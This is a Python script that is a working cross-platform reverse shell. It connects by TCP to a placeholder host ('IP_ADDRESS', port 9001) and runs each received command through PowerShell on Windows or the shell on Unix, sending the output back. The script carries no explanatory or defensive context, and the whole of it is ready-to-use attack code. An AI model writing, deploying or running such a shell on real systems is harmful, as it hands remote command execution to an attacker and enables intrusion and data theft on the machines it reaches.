# Windows (Linux/macOS).
import socket
import subprocess
import sys

def main():
    host = 'IP_ADDRESS'
    port = 9001
    
    try:
        # Create TCP socket and connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Send initial prompt
        sock.sendall(b'SHELL> ')
        
        while True:
            # Receive command
            data = sock.recv(4096)
            if not data:
                break
            
            # Decode command (remove trailing newline if present)
            command = data.decode('utf-8').rstrip('\n')
            
            if command.lower() == 'exit':
                break
            
            try:
                # Execute command using PowerShell on Windows or shell on Unix
                if sys.platform == 'win32':
                    # Use PowerShell on Windows
                    result = subprocess.run(
                        ['powershell', '-Command', command],
                        capture_output=True,
                        text=True,
                        shell=True,
                        timeout=30
                    )
                    output = result.stdout + result.stderr
                else:
                    # Use bash on Unix-like systems
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    output = result.stdout + result.stderr
                    
            except subprocess.TimeoutExpired:
                output = "Command timed out after 30 seconds\n"
            except Exception as e:
                output = f"Error executing command: {str(e)}\n"
            
            # Send output with prompt
            response = output + 'SHELL> '
            sock.sendall(response.encode('utf-8'))
    
    except ConnectionRefusedError:
        print(f"Connection refused to {host}:{port}")
    except socket.timeout:
        print("Connection timeout")
    except Exception as e:
        print(f"Error: {str(e)}")
    finally:
        try:
            sock.close()
        except:
            pass

if __name__ == "__main__":
    main()
